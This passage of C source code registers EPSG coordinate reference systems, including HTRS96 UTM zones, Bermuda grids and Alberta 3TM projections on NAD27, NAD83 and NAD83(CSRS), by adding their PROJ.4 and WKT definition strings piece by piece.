add_srs_wkt (p, 5,\n        \"T[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"912\");\n    add_srs_wkt (p, 6,\n        \"2\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4761\\\"]],PROJECTION[\\\"Lambert\");\n    add_srs_wkt (p, 7,\n        \"_Conformal_Conic_2SP\\\"],PARAMETER[\\\"standard_parallel_1\\\"\");\n    add_srs_wkt (p, 8,\n        \",45.91666666666666],PARAMETER[\\\"standard_parallel_2\\\",43\");\n    add_srs_wkt (p, 9,\n        \".08333333333334],PARAMETER[\\\"latitude_of_origin\\\",0],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"central_meridian\\\",16.5],PARAMETER[\\\"false_east\");\n    add_srs_wkt (p, 11,\n        \"ing\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",\");\n    add_srs_wkt (p, 12,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],A\");\n    add_srs_wkt (p, 13,\n        \"XIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3766\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3767, \"epsg\", 3767,\n        \"HTRS96 / UTM zone 33N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=33 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +\");\n    add_proj4text (p, 1,\n        \"units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"HTRS96 / UTM zone 33N\\\",GEOGCS[\\\"HTRS96\\\",DATUM\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Croatian_Terrestrial_Reference_System\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6761\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4761\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",15],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAMETE\");\n    add_srs_wkt (p, 10,\n        \"R[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 11,\n        \"G\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",\");\n    add_srs_wkt (p, 12,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3767\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3768, \"epsg\", 3768,\n        \"HTRS96 / UTM zone 34N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=34 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +\");\n    add_proj4text (p, 1,\n        \"units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"HTRS96 / UTM zone 34N\\\",GEOGCS[\\\"HTRS96\\\",DATUM\");\n    add_srs_wkt (p, 1,\n        \"[\\\"Croatian_Terrestrial_Reference_System\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6761\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4761\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",21],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAMETE\");\n    add_srs_wkt (p, 10,\n        \"R[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 11,\n        \"G\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",\");\n    add_srs_wkt (p, 12,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3768\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3769, \"epsg\", 3769,\n        \"Bermuda 1957 / UTM zone 20N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=20 +ellps=clrk66 +towgs84=-73,213,296,0,\");\n    add_proj4text (p, 1,\n        \"0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Bermuda 1957 / UTM zone 20N\\\",GEOGCS[\\\"Bermuda \");\n    add_srs_wkt (p, 1,\n        \"1957\\\",DATUM[\\\"Bermuda_1957\\\",SPHEROID[\\\"Clarke 1866\\\",6\");\n    add_srs_wkt (p, 2,\n        \"378206.4,294.9786982138982,AUTHORITY[\\\"EPSG\\\",\\\"7008\\\"]]\");\n    add_srs_wkt (p, 3,\n        \",TOWGS84[-73,213,296,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6216\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 5,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4216\\\"]],PROJECTION[\\\"Tran\");\n    add_srs_wkt (p, 7,\n        \"sverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],P\");\n    add_srs_wkt (p, 8,\n        \"ARAMETER[\\\"central_meridian\\\",-63],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 11,\n        \"PSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\"\");\n    add_srs_wkt (p, 12,\n        \",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3769\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3770, \"epsg\", 3770,\n        \"BDA2000 / Bermuda 2000 National Grid\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=32 +lon_0=-64.75 +k=1 +x_0=550000 +y_\");\n    add_proj4text (p, 1,\n        \"0=100000 +ellps=WGS84 +towgs84=0,0,0,0,0,0,0 +units=m +n\");\n    add_proj4text (p, 2,\n        \"o_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"BDA2000 / Bermuda 2000 National Grid\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"BDA2000\\\",DATUM[\\\"Bermuda_2000\\\",SPHEROID[\\\"WGS 84\\\",637\");\n    add_srs_wkt (p, 2,\n        \"8137,298.257223563,AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],TOWGS84\");\n    add_srs_wkt (p, 3,\n        \"[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6762\\\"]],PRIMEM[\\\"G\");\n    add_srs_wkt (p, 4,\n        \"reenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\");\n    add_srs_wkt (p, 5,\n        \"\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTH\");\n    add_srs_wkt (p, 6,\n        \"ORITY[\\\"EPSG\\\",\\\"4762\\\"]],PROJECTION[\\\"Transverse_Mercat\");\n    add_srs_wkt (p, 7,\n        \"or\\\"],PARAMETER[\\\"latitude_of_origin\\\",32],PARAMETER[\\\"c\");\n    add_srs_wkt (p, 8,\n        \"entral_meridian\\\",-64.75],PARAMETER[\\\"scale_factor\\\",1],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"false_easting\\\",550000],PARAMETER[\\\"false_no\");\n    add_srs_wkt (p, 10,\n        \"rthing\\\",100000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 11,\n        \"001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],\");\n    add_srs_wkt (p, 12,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"3770\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3771, \"epsg\", 3771,\n        \"NAD27 / Alberta 3TM ref merid 111 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-111 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Alberta 3TM ref merid 111 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD27\\\",DATUM[\\\"North_American_Datum_1927\\\",SPHEROID[\\\"C\");\n    add_srs_wkt (p, 2,\n        \"larke 1866\\\",6378206.4,294.9786982138982,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7008\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4267\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",-111],PARAMETER[\\\"scale_factor\\\",0.9999],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false_northin\");\n    add_srs_wkt (p, 10,\n        \"g\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AX\");\n    add_srs_wkt (p, 11,\n        \"IS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\");\n    add_srs_wkt (p, 12,\n        \"\\\"EPSG\\\",\\\"3771\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3772, \"epsg\", 3772,\n        \"NAD27 / Alberta 3TM ref merid 114 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-114 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Alberta 3TM ref merid 114 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD27\\\",DATUM[\\\"North_American_Datum_1927\\\",SPHEROID[\\\"C\");\n    add_srs_wkt (p, 2,\n        \"larke 1866\\\",6378206.4,294.9786982138982,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7008\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4267\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",-114],PARAMETER[\\\"scale_factor\\\",0.9999],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false_northin\");\n    add_srs_wkt (p, 10,\n        \"g\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AX\");\n    add_srs_wkt (p, 11,\n        \"IS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\");\n    add_srs_wkt (p, 12,\n        \"\\\"EPSG\\\",\\\"3772\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3773, \"epsg\", 3773,\n        \"NAD27 / Alberta 3TM ref merid 117 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-117 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Alberta 3TM ref merid 117 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD27\\\",DATUM[\\\"North_American_Datum_1927\\\",SPHEROID[\\\"C\");\n    add_srs_wkt (p, 2,\n        \"larke 1866\\\",6378206.4,294.9786982138982,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7008\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4267\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",-117],PARAMETER[\\\"scale_factor\\\",0.9999],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false_northin\");\n    add_srs_wkt (p, 10,\n        \"g\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AX\");\n    add_srs_wkt (p, 11,\n        \"IS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\");\n    add_srs_wkt (p, 12,\n        \"\\\"EPSG\\\",\\\"3773\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3774, \"epsg\", 3774,\n        \"NAD27 / Alberta 3TM ref merid 120 W (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Alberta 3TM ref merid 120 W (deprecated\");\n    add_srs_wkt (p, 1,\n        \")\\\",GEOGCS[\\\"NAD27\\\",DATUM[\\\"North_American_Datum_1927\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"Clarke 1866\\\",6378206.4,294.9786982138982,AU\");\n    add_srs_wkt (p, 3,\n        \"THORITY[\\\"EPSG\\\",\\\"7008\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6267\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4267\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",-120],PARAMETER[\\\"scale_fac\");\n    add_srs_wkt (p, 9,\n        \"tor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORT\");\n    add_srs_wkt (p, 12,\n        \"H],AUTHORITY[\\\"EPSG\\\",\\\"3774\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3775, \"epsg\", 3775,\n        \"NAD83 / Alberta 3TM ref merid 111 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-111 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Alberta 3TM ref merid 111 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD83\\\",DATUM[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"G\");\n    add_srs_wkt (p, 2,\n        \"RS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"701\");\n    add_srs_wkt (p, 3,\n        \"9\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 5,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Tran\");\n    add_srs_wkt (p, 7,\n        \"sverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],P\");\n    add_srs_wkt (p, 8,\n        \"ARAMETER[\\\"central_meridian\\\",-111],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\");\n    add_srs_wkt (p, 10,\n        \"\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 11,\n        \",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NOR\");\n    add_srs_wkt (p, 12,\n        \"TH],AUTHORITY[\\\"EPSG\\\",\\\"3775\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3776, \"epsg\", 3776,\n        \"NAD83 / Alberta 3TM ref merid 114 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-114 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Alberta 3TM ref merid 114 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD83\\\",DATUM[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"G\");\n    add_srs_wkt (p, 2,\n        \"RS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"701\");\n    add_srs_wkt (p, 3,\n        \"9\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 5,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Tran\");\n    add_srs_wkt (p, 7,\n        \"sverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],P\");\n    add_srs_wkt (p, 8,\n        \"ARAMETER[\\\"central_meridian\\\",-114],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\");\n    add_srs_wkt (p, 10,\n        \"\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 11,\n        \",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NOR\");\n    add_srs_wkt (p, 12,\n        \"TH],AUTHORITY[\\\"EPSG\\\",\\\"3776\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3777, \"epsg\", 3777,\n        \"NAD83 / Alberta 3TM ref merid 117 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-117 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Alberta 3TM ref merid 117 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD83\\\",DATUM[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"G\");\n    add_srs_wkt (p, 2,\n        \"RS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"701\");\n    add_srs_wkt (p, 3,\n        \"9\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 5,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Tran\");\n    add_srs_wkt (p, 7,\n        \"sverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],P\");\n    add_srs_wkt (p, 8,\n        \"ARAMETER[\\\"central_meridian\\\",-117],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\");\n    add_srs_wkt (p, 10,\n        \"\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 11,\n        \",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NOR\");\n    add_srs_wkt (p, 12,\n        \"TH],AUTHORITY[\\\"EPSG\\\",\\\"3777\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3778, \"epsg\", 3778,\n        \"NAD83 / Alberta 3TM ref merid 120 W (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Alberta 3TM ref merid 120 W (deprecated\");\n    add_srs_wkt (p, 1,\n        \")\\\",GEOGCS[\\\"NAD83\\\",DATUM[\\\"North_American_Datum_1983\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6269\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_o\");\n    add_srs_wkt (p, 8,\n        \"rigin\\\",0],PARAMETER[\\\"central_meridian\\\",-120],PARAMETE\");\n    add_srs_wkt (p, 9,\n        \"R[\\\"scale_factor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0\");\n    add_srs_wkt (p, 10,\n        \"],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3778\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3779, \"epsg\", 3779,\n        \"NAD83(CSRS) / Alberta 3TM ref merid 111 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-111 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / Alberta 3TM ref merid 111 W\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(CSRS)\\\",DATUM[\\\"NAD83_Canadian_Spatial_Refer\");\n    add_srs_wkt (p, 2,\n        \"ence_System\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25722210\");\n    add_srs_wkt (p, 3,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],A\");\n    add_srs_wkt (p, 4,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 5,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 6,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 7,\n        \"4617\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",-\");\n    add_srs_wkt (p, 9,\n        \"111],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\\\"fals\");\n    add_srs_wkt (p, 10,\n        \"e_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"me\");\n    add_srs_wkt (p, 11,\n        \"tre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",E\");\n    add_srs_wkt (p, 12,\n        \"AST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3779\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3780, \"epsg\", 3780,\n        \"NAD83(CSRS) / Alberta 3TM ref merid 114 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-114 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        